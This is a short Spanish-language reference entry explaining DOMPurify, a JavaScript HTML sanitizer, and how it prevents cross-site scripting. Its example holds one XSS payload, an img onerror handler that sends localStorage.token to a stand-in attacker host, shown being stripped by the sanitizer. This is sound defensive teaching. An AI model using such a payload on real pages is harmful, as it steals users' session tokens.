# DOMPurify

**Categoría:** Seguridad / Frontend
**Visto en:** _(pendiente — agrega aquí el proyecto donde lo uses)_

## Definición

DOMPurify es una librería de JavaScript que **sanitiza HTML**: recibe un texto con HTML que no controlas (un comentario, un post, contenido de un CMS) y devuelve una versión limpia, eliminando todo lo que pueda ejecutar código malicioso (`<script>`, atributos como `onerror`, URLs `javascript:`), pero conservando el HTML inofensivo (`<p>`, `<b>`, `<a>`, etc.).

Su propósito es prevenir ataques **XSS (Cross-Site Scripting)**: un atacante logra que su código JavaScript se ejecute en el navegador de otra persona, y desde ahí puede robar sesiones, tokens guardados en `localStorage` o actuar en nombre de la víctima.

```
Contenido externo  →  DOMPurify.sanitize()  →  HTML limpio  →  Página
(no confiable)        (quita lo peligroso)      (seguro)
```

Cuándo usarla: solo cuando necesitas **renderizar HTML que viene de fuera** (`innerHTML`, `{@html}` en Svelte, `dangerouslySetInnerHTML` en React). Cuándo NO hace falta: si solo muestras texto, los frameworks ya lo escapan automáticamente y DOMPurify sobra.

Limitaciones: protege en el navegador, pero no reemplaza la validación en el servidor ni una buena política CSP. Es una capa de defensa más, no la única.

## Ejemplo

Un blog permite que los autores escriban entradas con formato. Un atacante intenta colar código en el contenido:

```typescript
import DOMPurify from "dompurify";

const contenidoSucio = `
  <p>Hola, bienvenidos al blog</p>
  <img src="x" onerror="fetch('https://atacante.com?t=' + localStorage.token)">
`;

const contenidoLimpio = DOMPurify.sanitize(contenidoSucio);
// → <p>Hola, bienvenidos al blog</p><img src="x">
// El atributo onerror fue eliminado, el robo de token no ocurre.

elemento.innerHTML = contenidoLimpio;
```

Instalar:

```bash
npm install dompurify
```

## Relacionado

- [JWT](jwt.md)
- [SPA (Single Page Application)](spa.md)
